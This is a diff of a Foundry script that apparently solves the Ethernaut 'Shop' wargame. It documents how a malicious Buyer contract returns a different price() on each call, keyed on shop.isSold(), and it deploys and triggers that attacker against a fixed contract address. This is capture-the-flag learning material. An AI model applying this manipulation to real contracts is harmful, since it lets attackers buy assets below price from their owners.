@@ -21,20 +21,25 @@ contract Attacker {
 
 }
 
+/// @author agadzhalov
+/// @title Solution to Shop Ethernaut challenge
+/// @notice Solution: 
+///         Buyer(msg.sender) - We can deploy a malicious contract and execute the transaction on its behalf.
+///         price() - Since it's a view function, we can't change the state directly within it.
+///         By default, `isSold` is `false`, which means `!isSold` is initially `true`.
+///         Thus, when we check `price()` for the first time, it should return 100, and on the second check,
+///         it should return 1. To achieve this, we can utilize `shop.isSold()`.
 contract ShopScript is Script {
 
     Shop private shop = Shop(0x727a087fEc48C4189618D54Ff0f96125e88cF1C1);
-    /**
-     * Solution: 
-     * Buyer(msg.sender) - we can deploy malicious contract and execute the transaction on behalf of it.
-     * price() - since it's view we can't change the state. 
-     * By default bool is false, which means !isSold at the very beginning is true.
-     * This means that when we enter price() in the contract the first time should be 100, and the second time
-     * should be 1. For that reason we can use shop.isSold().
-     */
+
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        // Deploy the Attacker contract with the Shop contract address as a parameter
         Attacker attacker = new Attacker(address(shop));
+
+        // Execute the shopNow function in the Attacker contract to manipulate the Shop contract     
         attacker.shopNow();
         
         vm.stopBroadcast();
